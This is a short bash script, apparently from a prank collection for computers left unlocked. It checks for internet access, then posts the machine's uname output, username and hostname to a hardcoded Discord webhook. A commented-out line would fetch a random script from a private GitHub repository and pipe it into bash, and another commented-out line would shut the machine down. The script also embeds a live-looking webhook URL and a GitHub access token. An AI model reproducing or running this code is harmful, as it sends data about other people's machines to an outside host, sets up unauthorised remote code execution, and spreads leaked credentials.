#!/bin/bash

export WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
rdm=$(( $RANDOM % 15 ))

wget -q --spider http://google.com

if [ $? -eq 0 ]; then
	#curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | bash
	curl \
	  -H "Content-Type: application/json" \
	  -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
else
	echo "yes"
	#shutdown now
fi
